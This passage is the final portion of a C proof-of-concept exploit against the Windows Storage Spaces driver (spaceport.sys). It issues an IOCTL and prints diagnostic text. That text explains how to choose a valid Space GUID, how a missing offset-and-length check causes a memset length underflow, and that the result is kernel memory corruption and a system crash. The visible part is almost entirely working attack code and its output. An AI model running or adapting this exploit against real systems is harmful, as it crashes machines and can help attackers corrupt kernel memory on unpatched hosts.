    printf("[+] LastError: 0x%08lX\n", (unsigned long)lastError);
    printf("[+] BytesReturned: %lu\n", (unsigned long)bytesReturned);

    if (!ok) {
        printf("\n[!] IOCTL returned error 0x%08lX\n", (unsigned long)lastError);
        if (lastError == ERROR_NOT_FOUND) {
            printf("[!] ERROR_NOT_FOUND: SpaceId candidate did not match any Storage Space record in this pool\n");
            printf("[!] FindSpaceById returned NULL, vulnerable code path not reached\n");
            printf("[!] Try another +0x18 GUID from QueryDosDevice Space# links or from Get-VirtualDisk ObjectId/Path.\n");
            printf("[!] Example: %s %ls --space-guid {GUID-FROM-SPACE-LINK-OR-OBJECTID}\n", argv[0], devicePath);
        }
        else if (lastError == ERROR_ACCESS_DENIED) {
            printf("[!] ERROR_ACCESS_DENIED: Insufficient privileges for pool device\n");
        }
    }
    else {
        printf("\n[!] IOCTL succeeded - on an unpatched system the memset underflow has already occurred\n");
    }

    printf("\n[+] Expected vulnerable path (unpatched spaceport.sys):\n");
    printf("[+]   1. IopBuildDeviceIoControlRequest -> alloc system buffer(max(0x%X, 0x%X) = 0x%X)\n", POC_INPUT_SIZE, POC_OUTPUT_SIZE, POC_INPUT_SIZE);
    printf("[+]   2. SpPoolMapExtents reads inputLength(0x%X) >= 0x38 -> PASS\n", POC_INPUT_SIZE);
    printf("[+]   3. Size == 56, inputLength >= TotalLength -> PASS\n");
    printf("[+]   4. SDB_MAP_INFO::IntegrityCheck -> PASS (missing offset+length check)\n");
    printf("[+]   5. SDB_MAP_INFO::Mappings -> buf + 0x%X (SDB_RANGES*)\n", POC_MAPPING_OFFSET);
    printf("[+]   6. FindSpaceById(&buf[0x18]) -> must return non-NULL\n");
    printf("[+]   7. mappingEnd = 0x%X + 0x%X = 0x%X\n", POC_MAPPING_OFFSET, POC_MAPPING_LENGTH, mappingEnd);
    printf("[+]   8. outputLength = 0x%X\n", POC_OUTPUT_SIZE);
    printf("[+]   9. memset(buf+0x%X, 0, 0x%X-0x%X) = memset(buf+0x%X, 0, 0x%08X)\n", mappingEnd, POC_OUTPUT_SIZE, mappingEnd, mappingEnd, underflowLen);
    printf("[+]  10. KERNEL MEMORY CORRUPTION -> BSOD\n");

    CloseHandle(device);
    printf("\n[+] Done\n");
    return 0;
}
